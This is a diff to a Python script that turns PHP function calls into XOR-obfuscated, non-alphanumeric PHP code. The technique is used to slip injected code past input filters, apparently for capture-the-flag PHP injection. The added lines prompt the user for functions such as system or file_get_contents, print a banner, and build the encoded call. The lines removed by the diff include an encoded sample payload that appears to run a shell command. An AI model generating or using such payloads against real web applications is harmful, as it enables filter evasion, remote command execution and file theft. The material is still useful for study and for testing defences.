@@ -32,9 +32,21 @@ for i in a:
         alpha[chr(ord(i)^ord(j))] = i+"^"+j
 
 
+print ("""
+    $$$      $$       $$$          $$           $$  $$
+    $$$$     $$      $$$$          $$          $$   $$
+    $$ $$    $$     $$ $$          $$        $$     $$
+    $$  $$   $$        $$          $$      $$       $$
+    $$   $$  $$        $$          $$     $$$$$$$$$$$$$$$ 
+    $$    $$ $$        $$     $$   $$               $$
+    $$     $$$$        $$     $$   $$               $$
+    $$      $$$        $$       $$$$                $$
 
 
+""")
 
+print("php function : type something like  system or file_get_contents")
+print("parameter : just type parameter\n\n\n\n\n\n\n\n\n") 
 ######################################
 # Generate nonalphanumberic php code #
 ######################################
@@ -47,16 +59,12 @@ while 1:
     # XOR  
     funct = convert(function)
     para = convert(parameter)
-    if parameter != "''":
+    if parameter != "":
         print (function+"("+parameter+")")
-        code = Generate(funct,"$_")+Generate(para,"$__")+"($_)($__);"
+        code = Generate(funct,"$_")+Generate(para,"$__")+"$_($__);"
         print (code.replace("'~'^''^''","'~'^'^'"))
         
     else:
         print (function+"()")
-        code = Generate(funct,"$_")+Generate(para,"$__")+"($_)();"
+        code = Generate(funct,"$_")+Generate(para,"$__")+"$_();"
         print(code.replace("'~'^''^''","'~'^'^'"))
-        
-#print (Generate(para,"$__"))
-
-#$_='_'^',';$_.='_'^'&';$_.='_'^',';$_.='_'^'+';$_.='_'^':';$_.='@'^'-';$__='|'^'[';$__.='@'^',';$__.='_'^',';$__.='~'^'^';$__.='-';$__.='_'^'>';$__.='|'^'[';($_)($__);
